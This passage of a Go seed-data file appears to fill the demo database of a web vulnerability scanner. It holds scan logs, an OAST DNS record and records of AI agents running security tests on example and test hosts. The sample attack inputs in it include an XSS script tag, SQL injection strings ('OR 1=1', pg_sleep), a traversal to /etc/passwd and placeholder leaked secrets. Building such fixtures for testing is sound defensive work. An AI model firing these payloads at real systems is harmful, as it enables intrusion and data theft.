			QType:         "AAAA",
			RawRequest:    ";; QUESTION SECTION:\n;seed-oast-dns-noise." + oastDomain + ". IN AAAA",
			RawResponse:   ";; ANSWER SECTION:\nseed-oast-dns-noise." + oastDomain + ". 300 IN AAAA ::1",
			RemoteAddress: "203.0.113.42:44123",
			InteractedAt:  now.Add(-60 * time.Minute),
			CreatedAt:     now.Add(-60 * time.Minute),
		},
	}
}

// ---------------------------------------------------------------------------
// Scan Log seeds
// ---------------------------------------------------------------------------

func seedScanLogs(scans []*database.Scan) []*database.ScanLog {
	// Scan 1: completed full scan — full lifecycle with a pause/resume
	s1 := scans[0].StartedAt
	// Scan 2: completed API scan — normal lifecycle
	s2 := scans[1].StartedAt
	// Scan 3: running scan — still in progress
	s3 := scans[2].StartedAt
	// Scan 4: failed scan — error during discovery
	s4 := scans[3].StartedAt

	return []*database.ScanLog{
		// --- Scan 1: completed, with pause/resume ---
		{ScanUUID: scans[0].UUID, Level: "info", Message: "scan started", CreatedAt: s1},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "source-analysis", Message: "phase started — analyzing /opt/repos/example-frontend", Metadata: `{"source_path":"/opt/repos/example-frontend","framework":"next.js","language":"javascript"}`, CreatedAt: s1.Add(200 * time.Millisecond)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "source-analysis", Message: "extracted 14 routes, 2 auth endpoints, 2 sinks via AI source review", Metadata: `{"routes":14,"auth_endpoints":2,"sinks":2}`, CreatedAt: s1.Add(500 * time.Millisecond)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "discovery", Message: "phase started", CreatedAt: s1.Add(1 * time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /api/v1/products", CreatedAt: s1.Add(15 * time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint POST /api/v1/orders", CreatedAt: s1.Add(18 * time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /search?q=", CreatedAt: s1.Add(22 * time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /login", CreatedAt: s1.Add(25 * time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /dashboard", CreatedAt: s1.Add(30 * time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "discovery", Message: "discovered 42 endpoints across 3 hosts", Metadata: `{"hosts":["example.com","admin.example.com","cdn.example.com"],"endpoints":42}`, CreatedAt: s1.Add(2*time.Minute + 50*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "discovery", Message: "phase completed", CreatedAt: s1.Add(3 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "spidering", Message: "phase started", Metadata: `{"seed_urls":42}`, CreatedAt: s1.Add(3*time.Minute + 1*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "spidering", Message: "crawled https://example.com/ — 12 links found", CreatedAt: s1.Add(3*time.Minute + 5*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "spidering", Message: "crawled https://example.com/about — 4 links found", CreatedAt: s1.Add(3*time.Minute + 8*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "warn", Phase: "spidering", Message: "rate limited by example.com — backing off 2s", CreatedAt: s1.Add(3*time.Minute + 30*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "spidering", Message: "spidering completed: 85 URLs crawled, 23 new endpoints added", Metadata: `{"crawled":85,"new_endpoints":23}`, CreatedAt: s1.Add(4*time.Minute + 30*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "spidering", Message: "phase completed", CreatedAt: s1.Add(4*time.Minute + 31*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "dynamic-assessment", Message: "phase started", Metadata: `{"active_modules":42,"passive_modules":12,"total_records":85}`, CreatedAt: s1.Add(4*time.Minute + 32*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Message: "scan paused by user", CreatedAt: s1.Add(5 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "info", Message: "scan resumed", CreatedAt: s1.Add(7 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "xss-reflected: testing GET /search?q= — 6 payloads", CreatedAt: s1.Add(7*time.Minute + 10*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "sqli-error: testing GET /api/v1/products?id= — 4 payloads", CreatedAt: s1.Add(7*time.Minute + 30*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "dynamic-assessment", Message: "finding: XSS Reflected in /search?q= (high, firm)", Metadata: `{"module":"xss-reflected","severity":"high","confidence":"firm","url":"https://example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"}`, CreatedAt: s1.Add(8 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "dynamic-assessment", Message: "finding: SQL Injection in /api/v1/products?id= (critical, firm)", Metadata: `{"module":"sqli-error","severity":"critical","confidence":"firm","url":"https://example.com/api/v1/products?id=1'+OR+1=1--"}`, CreatedAt: s1.Add(9 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "warn", Phase: "dynamic-assessment", Message: "module timeout: sqli-time-based exceeded 30s on https://example.com/api/search", CreatedAt: s1.Add(10 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "lfi: testing GET /index.php?page= — 8 payloads", CreatedAt: s1.Add(10*time.Minute + 15*time.Second)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "dynamic-assessment", Message: "finding: Path Traversal in /index.php?page= (high, firm)", Metadata: `{"module":"lfi","severity":"high","confidence":"firm","url":"https://legacy.example.com/index.php?page=../../../etc/passwd"}`, CreatedAt: s1.Add(11 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "warn", Phase: "dynamic-assessment", Message: "WAF detected on admin.example.com — CloudFlare signature, adjusting payloads", Metadata: `{"waf":"cloudflare","host":"admin.example.com"}`, CreatedAt: s1.Add(12 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "openredirect: testing GET /redirect?url= — 3 payloads", CreatedAt: s1.Add(13 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "dynamic-assessment", Message: "scan progress: 72/85 records processed, 15 findings so far", Metadata: `{"processed":72,"total":85,"findings":15}`, CreatedAt: s1.Add(14 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "info", Phase: "dynamic-assessment", Message: "phase completed", Metadata: `{"records_scanned":85,"findings":15,"duration_ms":630000}`, CreatedAt: s1.Add(15 * time.Minute)},
		{ScanUUID: scans[0].UUID, Level: "info", Message: "scan finished", Metadata: `{"total_requests":85,"total_findings":15,"duration_ms":900000}`, CreatedAt: s1.Add(15*time.Minute + 1*time.Second)},

		// --- Scan 2: completed API scan ---
		{ScanUUID: scans[1].UUID, Level: "info", Message: "scan started", CreatedAt: s2},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "discovery", Message: "phase started", CreatedAt: s2.Add(1 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "discovery", Message: "parsing OpenAPI spec from https://api.shop.local/openapi.json", CreatedAt: s2.Add(3 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /api/v1/products", CreatedAt: s2.Add(5 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint POST /api/v1/products", CreatedAt: s2.Add(5 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /api/v1/orders", CreatedAt: s2.Add(6 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint POST /api/v1/orders", CreatedAt: s2.Add(6 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint POST /api/v1/auth/login", CreatedAt: s2.Add(7 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "discovery", Message: "OpenAPI import: 28 endpoints from 1 spec", Metadata: `{"specs":1,"endpoints":28}`, CreatedAt: s2.Add(10 * time.Second)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "discovery", Message: "phase completed", CreatedAt: s2.Add(5 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "dynamic-assessment", Message: "phase started", Metadata: `{"active_modules":18,"passive_modules":8,"total_records":120}`, CreatedAt: s2.Add(5*time.Minute + 1*time.Second)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "sqli-error: testing POST /api/v1/auth/login — 6 payloads", CreatedAt: s2.Add(6 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "ssti: testing POST /api/v1/products — 4 payloads", CreatedAt: s2.Add(8 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "dynamic-assessment", Message: "finding: SQL Injection in POST /api/v1/auth/login (high, firm)", Metadata: `{"module":"sqli-error","severity":"high","confidence":"firm","url":"https://api.shop.local/api/v1/auth/login"}`, CreatedAt: s2.Add(10 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "warn", Phase: "dynamic-assessment", Message: "429 Too Many Requests from api.shop.local — throttling to 2 req/s", Metadata: `{"host":"api.shop.local","rate_limit":"2/s"}`, CreatedAt: s2.Add(15 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "dynamic-assessment", Message: "finding: SSTI in POST /api/v1/products (medium, tentative)", Metadata: `{"module":"ssti","severity":"medium","confidence":"tentative","url":"https://api.shop.local/api/v1/products"}`, CreatedAt: s2.Add(20 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "dynamic-assessment", Message: "scan progress: 120/120 records processed, 9 findings", Metadata: `{"processed":120,"total":120,"findings":9}`, CreatedAt: s2.Add(29 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "info", Phase: "dynamic-assessment", Message: "phase completed", Metadata: `{"records_scanned":120,"findings":9,"duration_ms":1500000}`, CreatedAt: s2.Add(30 * time.Minute)},
		{ScanUUID: scans[1].UUID, Level: "info", Message: "scan finished", Metadata: `{"total_requests":120,"total_findings":9,"duration_ms":1800000}`, CreatedAt: s2.Add(30*time.Minute + 1*time.Second)},

		// --- Scan 3: running (still in progress) ---
		{ScanUUID: scans[2].UUID, Level: "info", Message: "scan started", CreatedAt: s3},
		{ScanUUID: scans[2].UUID, Level: "info", Phase: "discovery", Message: "phase started", CreatedAt: s3.Add(1 * time.Second)},
		{ScanUUID: scans[2].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /", CreatedAt: s3.Add(5 * time.Second)},
		{ScanUUID: scans[2].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /post/hello-world", CreatedAt: s3.Add(8 * time.Second)},
		{ScanUUID: scans[2].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint GET /post/sql-injection-101", CreatedAt: s3.Add(10 * time.Second)},
		{ScanUUID: scans[2].UUID, Level: "trace", Phase: "discovery", Message: "discovered endpoint POST /post/hello-world/comment", CreatedAt: s3.Add(12 * time.Second)},
		{ScanUUID: scans[2].UUID, Level: "info", Phase: "discovery", Message: "discovered 14 endpoints on blog.test", Metadata: `{"hosts":["blog.test"],"endpoints":14}`, CreatedAt: s3.Add(1*time.Minute + 55*time.Second)},
		{ScanUUID: scans[2].UUID, Level: "info", Phase: "discovery", Message: "phase completed", CreatedAt: s3.Add(2 * time.Minute)},
		{ScanUUID: scans[2].UUID, Level: "info", Phase: "dynamic-assessment", Message: "phase started", Metadata: `{"active_modules":6,"passive_modules":4,"total_records":30}`, CreatedAt: s3.Add(2*time.Minute + 1*time.Second)},
		{ScanUUID: scans[2].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "xss-reflected: testing GET /?search= — 6 payloads", CreatedAt: s3.Add(3 * time.Minute)},
		{ScanUUID: scans[2].UUID, Level: "trace", Phase: "dynamic-assessment", Message: "xss-stored: testing POST /post/hello-world/comment — 4 payloads", CreatedAt: s3.Add(4 * time.Minute)},
		{ScanUUID: scans[2].UUID, Level: "info", Phase: "dynamic-assessment", Message: "finding: XSS Reflected in /?search= (medium, tentative)", Metadata: `{"module":"xss-reflected","severity":"medium","confidence":"tentative","url":"https://blog.test/?search=%3Cimg+src%3Dx%3E"}`, CreatedAt: s3.Add(5 * time.Minute)},
		{ScanUUID: scans[2].UUID, Level: "info", Phase: "dynamic-assessment", Message: "scan progress: 18/30 records processed, 2 findings so far", Metadata: `{"processed":18,"total":30,"findings":2}`, CreatedAt: s3.Add(8 * time.Minute)},

		// --- Scan 4: failed ---
		{ScanUUID: scans[3].UUID, Level: "info", Message: "scan started", CreatedAt: s4},
		{ScanUUID: scans[3].UUID, Level: "info", Phase: "discovery", Message: "phase started", CreatedAt: s4.Add(1 * time.Second)},
		{ScanUUID: scans[3].UUID, Level: "warn", Phase: "discovery", Message: "DNS resolution failed for unreachable.internal, retrying (1/3)", Metadata: `{"host":"unreachable.internal","attempt":1}`, CreatedAt: s4.Add(10 * time.Second)},
		{ScanUUID: scans[3].UUID, Level: "warn", Phase: "discovery", Message: "DNS resolution failed for unreachable.internal, retrying (2/3)", Metadata: `{"host":"unreachable.internal","attempt":2}`, CreatedAt: s4.Add(20 * time.Second)},
		{ScanUUID: scans[3].UUID, Level: "error", Phase: "discovery", Message: "phase failed: connection timeout after 30s: dial tcp: lookup unreachable.internal: no such host", Metadata: `{"host":"unreachable.internal","error":"no such host"}`, CreatedAt: s4.Add(30 * time.Second)},
		{ScanUUID: scans[3].UUID, Level: "error", Message: "scan failed: all targets unreachable", CreatedAt: s4.Add(30*time.Second + 500*time.Millisecond)},
	}
}

// ---------------------------------------------------------------------------
// Agent run seeds
// ---------------------------------------------------------------------------

func seedAgenticScans(scans []*database.Scan) []*database.AgenticScan {
	now := time.Now()

	return []*database.AgenticScan{
		// 1. Completed query — code review for XSS
		{
			UUID:         "agent-0001-aaaa-bbbb-cccc-ddddeeee0001",
			Mode:         "query",
			AgentName:    "claude",
			Protocol:     "sdk",
			Model:        "claude-sonnet-4-6",
			TemplateID:   "code-review",
			TargetURL:    "https://example.com",
			SourcePath:   "/opt/repos/example-frontend",
			SourceType:   database.SourceTypeLocal,
			SessionDir:   "~/.vigolium/agent-sessions/agent-0001",
			Status:       "completed",
			FindingCount: 3,
			RecordCount:  0,
			SavedCount:   3,
			PromptSent:   "Review the source code at /app/src for XSS vulnerabilities. Focus on user input handling in template rendering and DOM manipulation.",
			AgentRawOutput: `## Findings

### 1. Reflected XSS in search handler (HIGH)
File: src/handlers/search.go:47
The search query parameter is reflected directly into the HTML template without escaping.

### 2. Stored XSS in comment submission (MEDIUM)
File: src/handlers/comments.go:92
User-submitted comments are stored and rendered without sanitization.

### 3. DOM-based XSS in client router (LOW)
File: src/static/js/router.js:15
The hash fragment is used to set innerHTML without encoding.`,
			AttackPlan:        `{"focus_areas":["template rendering","user input handling","DOM manipulation"],"modules":["xss-reflected","xss-stored","xss-dom"],"targets":["search handler","comment submission","client router"]}`,
			TokenUsage:        map[string]interface{}{"query": map[string]interface{}{"input": 8400, "output": 1850}},
			TotalInputTokens:  8400,
			TotalOutputTokens: 1850,
			EstimatedCostUSD:  0.0532,
			StartedAt:         now.Add(-3 * time.Hour),
			CompletedAt:       now.Add(-3*time.Hour + 45*time.Second),
			DurationMs:        45000,
			CreatedAt:         now.Add(-3 * time.Hour),
		},
		// 2. Completed autopilot — interactive scan
		{
			UUID:             "agent-0002-aaaa-bbbb-cccc-ddddeeee0002",
			ScanUUID:         scans[0].UUID,
			Mode:             "autopilot",
			AgentName:        "claude",
			Protocol:         "sdk",
			Model:            "claude-opus-4-7",
			InputRaw:         "https://example.com/api/v1/products",
			InputType:        "url",
			TargetURL:        "https://example.com",
			VulnType:         "sqli",
			InputRecordCount: 1,
			Status:           "completed",
			FindingCount:     2,
			RecordCount:      18,
			SavedCount:       2,
			SessionID:        "agent-sess-a1b2c3d4",
			SessionDir:       "~/.vigolium/agent-sessions/agent-0002",
			PromptSent:       "Test the API endpoint https://example.com/api/v1/products for SQL injection vulnerabilities. Use both error-based and time-based techniques.",
			AgentRawOutput: `I'll systematically test the /api/v1/products endpoint for SQL injection.

## Step 1: Enumerate parameters
Running: vigolium scan-url "https://example.com/api/v1/products?id=1" -m sqli

## Step 2: Error-based testing
Found SQL error disclosure when injecting single quote in id parameter.
The error message reveals PostgreSQL 14.2 backend.

## Step 3: Time-based confirmation
Confirmed blind SQL injection via time delay: id=1'+AND+pg_sleep(5)--

## Results
- SQLi Error-based in /api/v1/products?id= (CRITICAL)
- SQLi Time-based blind in /api/v1/products?id= (HIGH)`,
			TokenUsage: map[string]interface{}{
				"plan": map[string]interface{}{"input": 4200, "output": 780},
				"scan": map[string]interface{}{"input": 18500, "output": 3120},
			},
			TotalInputTokens:  22700,
			TotalOutputTokens: 3900,
			EstimatedCostUSD:  0.6330,
			StorageURL:        "gs://vigolium-agents/proj-default/agent-0002.tar.gz",
			StartedAt:         now.Add(-2*time.Hour - 30*time.Minute),
			CompletedAt:       now.Add(-2*time.Hour - 27*time.Minute),
			DurationMs:        180000,
			CreatedAt:         now.Add(-2*time.Hour - 30*time.Minute),
		},
		// 3. Completed swarm — full 7-phase scan (master run)
		{
			UUID:             "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
			ScanUUID:         scans[1].UUID,
			Mode:             "swarm",
			AgentName:        "claude",
			Protocol:         "sdk",
			Model:            "claude-opus-4-7",
			TargetURL:        "https://api.shop.local",
			SourcePath:       "https://github.com/vigolium/shop-api",
			SourceType:       database.SourceTypeGitURL,
			InputRecordCount: 28,
			Status:           "completed",
			CurrentPhase:     "report",
			PhasesRun:        []string{"source-analysis", "discover", "plan", "scan", "triage", "rescan", "report"},
			FindingCount:     5,
			RecordCount:      120,
			SavedCount:       5,
			AttackPlan:       `{"phases":["source-analysis","discover","plan","scan","triage","rescan","report"],"focus_areas":["authentication bypass","IDOR","mass assignment"],"modules":["sqli","ssti","idor","mass-assign"],"custom_extensions":["shop-auth-bypass.js"]}`,
			TriageResult:     `{"total_findings":8,"confirmed":5,"false_positives":3,"severity_breakdown":{"critical":1,"high":2,"medium":2},"notes":"3 SSTI findings were false positives caused by template syntax in API documentation responses"}`,
			ResultJSON:       `{"findings":[{"module":"sqli-error","severity":"critical","url":"https://api.shop.local/api/v1/auth/login","description":"SQL injection in login endpoint allows authentication bypass"},{"module":"idor","severity":"high","url":"https://api.shop.local/api/v1/users/2","description":"IDOR allows accessing other users' profiles by changing user ID"},{"module":"mass-assign","severity":"high","url":"https://api.shop.local/api/v1/users/me","description":"Mass assignment allows setting admin role via PATCH request"},{"module":"ssti","severity":"medium","url":"https://api.shop.local/api/v1/products","description":"Server-side template injection in product description field"},{"module":"crlf","severity":"medium","url":"https://api.shop.local/api/v1/export","description":"CRLF injection in export filename parameter"}]}`,
			TokenUsage: map[string]interface{}{
				"source-analysis": map[string]interface{}{"input": 42000, "output": 5400},
				"plan":            map[string]interface{}{"input": 15200, "output": 2100},
				"extension":       map[string]interface{}{"input": 9800, "output": 1750},
				"triage":          map[string]interface{}{"input": 28000, "output": 4200},
				"rescan":          map[string]interface{}{"input": 12000, "output": 1800},
			},
			TotalInputTokens:  107000,
			TotalOutputTokens: 15250,
			EstimatedCostUSD:  2.7488,
			SessionID:         "agent-sess-swarm-shop",
			SessionDir:        "~/.vigolium/agent-sessions/agent-0003",
			StorageURL:        "gs://vigolium-agents/proj-default/agent-0003.tar.gz",
			StartedAt:         now.Add(-1*time.Hour - 30*time.Minute),
			CompletedAt:       now.Add(-1 * time.Hour),
			DurationMs:        1800000,
			CreatedAt:         now.Add(-1*time.Hour - 30*time.Minute),
		},
		// 3a. Swarm sub-run — source-analysis specialist spawned by agent-0003
		{
			UUID:                  "agent-0003a-aaaa-bbbb-cccc-ddddeeee0003",
			ScanUUID:              scans[1].UUID,
			ParentAgenticScanUUID: "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
			Mode:                  "swarm",
			AgentName:             "source-analyst",
			Protocol:              "sdk",
			Model:                 "claude-sonnet-4-6",
			TargetURL:             "https://api.shop.local",
			SourcePath:            "https://github.com/vigolium/shop-api",
			SourceType:            database.SourceTypeGitURL,
			InputRecordCount:      28,
			Status:                "completed",
			CurrentPhase:          "source-analysis",
			PhasesRun:             []string{"source-analysis"},
			FindingCount:          0,
			RecordCount:           28,
			SavedCount:            0,
			AgentRawOutput:        "Analyzed 12 route files in app/routes/. Identified 28 HTTP routes, 4 auth endpoints, 7 SQL sinks, 2 filesystem sinks. Output written to session plan.",
			TokenUsage: map[string]interface{}{
				"explore":    map[string]interface{}{"input": 18500, "output": 2400},
				"format":     map[string]interface{}{"input": 12000, "output": 1800},
				"extensions": map[string]interface{}{"input": 11500, "output": 1200},
			},
			TotalInputTokens:  42000,
			TotalOutputTokens: 5400,
			EstimatedCostUSD:  0.2268,
			SessionDir:        "~/.vigolium/agent-sessions/agent-0003/children/source-analysis",
			StartedAt:         now.Add(-1*time.Hour - 28*time.Minute),
			CompletedAt:       now.Add(-1*time.Hour - 18*time.Minute),
			DurationMs:        600000,
			CreatedAt:         now.Add(-1*time.Hour - 28*time.Minute),
		},
		// 3b. Swarm sub-run — triage specialist spawned by agent-0003
		{
			UUID:                  "agent-0003b-aaaa-bbbb-cccc-ddddeeee0003",
			ScanUUID:              scans[1].UUID,
			ParentAgenticScanUUID: "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
			Mode:                  "swarm",
			AgentName:             "triager",
			Protocol:              "sdk",
			Model:                 "claude-opus-4-7",
			TargetURL:             "https://api.shop.local",
			InputRecordCount:      8,
			Status:                "completed",
			CurrentPhase:          "triage",
			PhasesRun:             []string{"triage"},
			FindingCount:          5,
			SavedCount:            5,
			TriageResult:          `{"total_findings":8,"confirmed":5,"false_positives":3,"severity_breakdown":{"critical":1,"high":2,"medium":2}}`,
			TokenUsage: map[string]interface{}{
				"triage": map[string]interface{}{"input": 28000, "output": 4200},
			},
			TotalInputTokens:  28000,
			TotalOutputTokens: 4200,
			EstimatedCostUSD:  0.7350,
			SessionDir:        "~/.vigolium/agent-sessions/agent-0003/children/triage",
			RetryCount:        1,
			StartedAt:         now.Add(-1*time.Hour - 12*time.Minute),
			CompletedAt:       now.Add(-1*time.Hour - 5*time.Minute),
			DurationMs:        420000,
			CreatedAt:         now.Add(-1*time.Hour - 12*time.Minute),
		},
		// 4. Running swarm — in scan phase
		{
			UUID:              "agent-0004-aaaa-bbbb-cccc-ddddeeee0004",
			Mode:              "swarm",
			AgentName:         "claude",
			Protocol:          "sdk",
			Model:             "claude-opus-4-7",
			TargetURL:         "https://blog.test",
			InputRecordCount:  14,
			Status:            "running",
			CurrentPhase:      "scan",
			PhasesRun:         []string{"discover", "plan"},
			FindingCount:      0,
			RecordCount:       30,
			AttackPlan:        `{"phases":["discover","plan","scan","triage","report"],"focus_areas":["XSS in comments","CSRF on forms","path traversal"],"modules":["xss","csrf","lfi"]}`,
			TokenUsage:        map[string]interface{}{"plan": map[string]interface{}{"input": 6800, "output": 1200}},
			TotalInputTokens:  6800,
			TotalOutputTokens: 1200,
			EstimatedCostUSD:  0.1920,
			SessionDir:        "~/.vigolium/agent-sessions/agent-0004",
			StartedAt:         now.Add(-12 * time.Minute),
			CreatedAt:         now.Add(-12 * time.Minute),
		},
		// 5. Failed query — agent timeout (pipe protocol, cheap)
		{
			UUID:              "agent-0005-aaaa-bbbb-cccc-ddddeeee0005",
			Mode:              "query",
			AgentName:         "gemini",
			Protocol:          "pipe",
			Model:             "gemini-2.5-pro",
			TemplateID:        "endpoint-discovery",
			TargetURL:         "https://unreachable.internal",
			Status:            "failed",
			ErrorMessage:      "agent execution timed out after 120s: context deadline exceeded",
			PromptSent:        "Discover all API endpoints exposed by the application at https://unreachable.internal. Analyze JavaScript bundles and API documentation.",
			TokenUsage:        map[string]interface{}{"query": map[string]interface{}{"input": 1200, "output": 0}},
			TotalInputTokens:  1200,
			TotalOutputTokens: 0,
			EstimatedCostUSD:  0.0015,
			RetryCount:        2,
			StartedAt:         now.Add(-6 * time.Hour),
			CompletedAt:       now.Add(-6*time.Hour + 2*time.Minute),
			DurationMs:        120000,
			CreatedAt:         now.Add(-6 * time.Hour),
		},
		// 6. Completed swarm — multi-input targeted scan
		{
			UUID:             "agent-0006-aaaa-bbbb-cccc-ddddeeee0006",
			ScanUUID:         scans[0].UUID,
			Mode:             "scan",
			AgentName:        "claude",
			Protocol:         "sdk",
			Model:            "claude-opus-4-7",
			TargetURL:        "https://example.com",
			VulnType:         "xss,sqli,lfi",
			ModuleNames:      []string{"xss-reflected", "xss-stored", "sqli-error", "sqli-time", "lfi"},
			InputRecordCount: 15,
			Status:           "completed",
			FindingCount:     7,
			RecordCount:      85,
			SavedCount:       7,
			AttackPlan:       `{"iterations":3,"batch_size":5,"modules":["xss-reflected","xss-stored","sqli-error","sqli-time","lfi"],"focus_areas":["search functionality","file inclusion","API parameters"],"custom_extensions":["example-auth-header.js"]}`,
			TriageResult:     `{"total_findings":12,"confirmed":7,"false_positives":5,"severity_breakdown":{"critical":1,"high":3,"medium":2,"low":1}}`,
			ResultJSON:       `{"findings":[{"module":"sqli-error","severity":"critical","url":"https://example.com/api/v1/products?id=1"},{"module":"xss-reflected","severity":"high","url":"https://example.com/search?q=test"},{"module":"lfi","severity":"high","url":"https://legacy.example.com/index.php?page=home"},{"module":"xss-reflected","severity":"high","url":"https://example.com/profile/1"},{"module":"sqli-time","severity":"medium","url":"https://example.com/api/v1/orders?status=pending"},{"module":"xss-stored","severity":"medium","url":"https://blog.test/post/hello-world/comment"},{"module":"lfi","severity":"low","url":"https://example.com/static/../README.md"}]}`,
			TokenUsage: map[string]interface{}{
				"plan":   map[string]interface{}{"input": 12000, "output": 1900},
				"scan":   map[string]interface{}{"input": 34000, "output": 5200},
				"triage": map[string]interface{}{"input": 18000, "output": 3100},
			},
			TotalInputTokens:  64000,
			TotalOutputTokens: 10200,
			EstimatedCostUSD:  1.7250,
			SessionID:         "agent-sess-example-scan",
			SessionDir:        "~/.vigolium/agent-sessions/agent-0006",
			StorageURL:        "gs://vigolium-agents/proj-default/agent-0006.tar.gz",
			StartedAt:         now.Add(-45 * time.Minute),
			CompletedAt:       now.Add(-30 * time.Minute),
			DurationMs:        900000,
			CreatedAt:         now.Add(-45 * time.Minute),
		},
		// 7. Completed query — secret detection
		{
			UUID:         "agent-0007-aaaa-bbbb-cccc-ddddeeee0007",
			Mode:         "query",
			AgentName:    "claude",
			Protocol:     "codex-sdk",
			Model:        "gpt-5",
			TemplateID:   "secret-scan",
			TargetURL:    "https://api.shop.local",
			SourcePath:   "/opt/repos/shop-api",
			SourceType:   database.SourceTypeLocal,
			Status:       "completed",
			FindingCount: 4,
			SavedCount:   4,
			PromptSent:   "Scan the source code and HTTP responses for exposed secrets, API keys, tokens, and credentials.",
			AgentRawOutput: `## Secret Detection Results

### 1. Hardcoded API Key (HIGH)
File: src/config/payment.go:12
Found Stripe live API key: sk-live-abc123xyz789def456

### 2. JWT Secret in Environment (HIGH)
File: docker-compose.yml:34
JWT_SECRET exposed in docker-compose with value "super-secret-jwt-key-change-me"

### 3. Database Password in Config (MEDIUM)
File: src/config/database.go:8
Hardcoded PostgreSQL password: "postgres:p@ssw0rd@localhost:5432"

### 4. AWS Access Key in Test File (LOW)
File: test/fixtures/aws_config.json:3
AWS access key ID found: AKIAIOSFODNN7EXAMPLE (appears to be test/example key)`,
			TokenUsage:        map[string]interface{}{"query": map[string]interface{}{"input": 22000, "output": 3100}},
			TotalInputTokens:  22000,
			TotalOutputTokens: 3100,
			EstimatedCostUSD:  0.3350,
			SessionDir:        "~/.vigolium/agent-sessions/agent-0007",
			StartedAt:         now.Add(-4 * time.Hour),
			CompletedAt:       now.Add(-4*time.Hour + 30*time.Second),
			DurationMs:        30000,
			CreatedAt:         now.Add(-4 * time.Hour),
		},
		// 8. Completed autopilot with source code
		{
			UUID:             "agent-0008-aaaa-bbbb-cccc-ddddeeee0008",
			Mode:             "autopilot",
			AgentName:        "claude",
			Protocol:         "sdk",
			Model:            "claude-sonnet-4-6",
			InputRaw:         "curl -X POST https://api.shop.local/api/v1/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}'",
			InputType:        "curl",
			TargetURL:        "https://api.shop.local",
			VulnType:         "authentication",
			InputRecordCount: 1,
			Status:           "completed",
			FindingCount:     2,
			RecordCount:      12,
			SavedCount:       2,
			SessionID:        "agent-sess-e5f6g7h8",
			SessionDir:       "~/.vigolium/agent-sessions/agent-0008",
			AgentRawOutput: `I'll test the authentication endpoint for common vulnerabilities.

## Step 1: Baseline request
Running: vigolium scan-request --raw "POST /api/v1/auth/login HTTP/1.1\r\nHost: api.shop.local\r\n..."

## Step 2: Brute force protection check
No rate limiting detected after 50 requests. This is a finding.

## Step 3: Password policy check
Weak passwords accepted (single character passwords work).

## Step 4: JWT analysis
JWT token uses HS256 with weak secret. Token can be forged.

## Results
- Missing rate limiting on login endpoint (MEDIUM)
- Weak JWT signing secret allows token forgery (HIGH)`,
			TokenUsage: map[string]interface{}{
				"plan":  map[string]interface{}{"input": 3200, "output": 580},
